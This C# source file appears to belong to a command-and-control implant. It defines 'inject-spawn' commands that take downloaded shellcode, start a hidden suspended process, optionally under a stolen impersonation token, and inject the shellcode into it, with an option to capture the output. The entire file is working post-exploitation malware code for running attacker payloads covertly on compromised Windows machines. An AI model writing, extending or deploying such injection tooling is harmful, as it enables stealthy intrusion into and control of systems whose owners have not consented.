using Agent.Helpers;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class SpawnInjectCommand : AgentCommand
    {
        public override string Name => "inject-spawn";

        protected virtual bool RedirectOutput { get; set; } = false;

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {

            this.CheckFileDownloaded(task, context);

            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var shellcode = file.GetFileContent();

            try
            {

                var winAPI = WinAPIWrapper.CreateInstance(context.ConfigService.APIAccessType);

                var creationParms = new ProcessCreationParameters()
                {
                    Application = context.ConfigService.SpawnToX64,
                    RedirectOutput = this.RedirectOutput,
                    CreateNoWindow = true,
                    CreateSuspended = true,
                    CurrentDirectory = Environment.CurrentDirectory
                };

                if (ImpersonationHelper.HasCurrentImpersonation)
                    creationParms.Token = ImpersonationHelper.ImpersonatedToken;

                var procResult = winAPI.CreateProcess(creationParms);

                winAPI.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, context.ConfigService.APIInjectionMethod);

                if (creationParms.RedirectOutput)
                    winAPI.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
                else
                    context.AppendResult($"Injection succeed.");
            }
            catch (Exception ex)
            {
                context.Error($"Injection failed : {ex}");
                return;
            }


        }
    }

    public class SpawnWaitInjectCommand : SpawnInjectCommand
    {
        public override string Name => "inject-spawn-wait";

        protected override bool RedirectOutput => true;

     
    }
}
